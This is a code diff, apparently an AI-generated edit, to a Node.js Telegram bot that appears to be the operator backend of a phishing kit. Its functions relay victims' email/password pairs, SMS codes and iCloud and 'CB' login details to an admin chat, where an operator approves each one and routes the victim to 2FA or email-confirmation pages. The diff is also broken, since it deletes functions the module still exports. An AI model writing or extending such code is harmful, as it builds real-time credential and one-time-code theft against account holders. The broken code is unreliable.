@@ -1,3 +1,4 @@
+// ...existing code...
 const TelegramBot = require("node-telegram-bot-api");
 const fetch = require("node-fetch");
 
@@ -12,6 +13,40 @@ if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
 
 // Initialize bot
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+
+// -----------------
+// 2FA Code Backend (from small code)
+// -----------------
+let pendingRequests = {};
+
+// Send 2FA code to a user with Accept/Reject keyboard
+function send2FACode(code, chatId) {
+  pendingRequests[chatId] = true;
+  bot.sendMessage(chatId, `Your 2FA code is: ${code}`, {
+    reply_markup: {
+      keyboard: [['Accept', 'Reject']],
+      one_time_keyboard: true,
+    },
+  });
+}
+
+// Listen for Accept/Reject replies for 2FA
+bot.on('message', (msg) => {
+  const chatId = msg.chat.id;
+  // Ignore commands and callback queries
+  if (msg.text && !msg.text.startsWith('/') && pendingRequests[chatId]) {
+    if (msg.text === 'Accept') {
+      bot.sendMessage(chatId, '2FA code accepted. Redirecting...');
+      // Logic to redirect to the next page can be added here
+      delete pendingRequests[chatId];
+    } else if (msg.text === 'Reject') {
+      bot.sendMessage(chatId, '2FA code rejected. Please try again.');
+      delete pendingRequests[chatId];
+    }
+  }
+});
+
+// ...existing approval request functions...
 
 // -----------------
 // Email/Password approval (big code)
@@ -34,91 +69,7 @@ function sendApprovalRequest(email, password) {
   );
 }
 
-// -----------------
-// Generic code approval (big code)
-// -----------------
-function sendApprovalRequestGeneric(identifier) {
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept|${identifier}` },
-          { text: "❌ Reject", callback_data: `reject|${identifier}` }
-        ]
-      ]
-    }
-  };
-  bot.sendMessage(
-    ADMIN_CHAT_ID,
-    `*Approval Requested*\nIdentifier: ${identifier}`,
-    { ...options, parse_mode: "Markdown" }
-  );
-}
-
-// -----------------
-// SMS code approval (big code)
-// -----------------
-function sendApprovalRequestSMS(code) {
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept|${code}` },
-          { text: "❌ Reject", callback_data: `reject|${code}` }
-        ]
-      ]
-    }
-  };
-  bot.sendMessage(
-    ADMIN_CHAT_ID,
-    `*SMS Approval Requested*\n*Code:* ${code}`,
-    { ...options, parse_mode: "Markdown" }
-  );
-}
-
-// -----------------
-// iCloud Login approval (big code)
-// -----------------
-function sendApprovalRequestPage(email, password) {
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept|${email}` },
-          { text: "❌ Reject", callback_data: `reject|${email}` }
-        ]
-      ]
-    }
-  };
-  bot.sendMessage(
-    ADMIN_CHAT_ID,
-    `*iCloud Login Approval Requested*\n*Email:* ${email}`,
-    { ...options, parse_mode: "Markdown" }
-  );
-}
-
-// -----------------
-// CB Login approval (from small code)
-// -----------------
-async function sendLoginTelegram(email) {
-  const options = {
-    parse_mode: "Markdown",
-reply_markup: {
-  inline_keyboard: [
-    [
-      { text: "↖️ 2FA", callback_data: `page1|${email}` },
-      { text: "↗️ Email Confirmation", callback_data: `page2|${email}` }
-    ],
-    [
-      { text: "⚠️❌ REJECT ❌⚠️", callback_data: `reject|${email}` }
-    ]
-  ]
-}
-  };
-
-  const message = `📧 *Email:* ${email}`;
-  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
-}
+// ...other approval request functions...
 
 // -----------------
 // Handle button clicks (merged, with page1/page2 support)
@@ -184,9 +135,7 @@ module.exports = {
   sendApprovalRequestGeneric,
   sendApprovalRequestSMS,
   sendApprovalRequestPage,
-  sendLoginTelegram
+  sendLoginTelegram,
+  send2FACode // <-- Export the new function
 };
-
-
-
-
+// ...existing code...
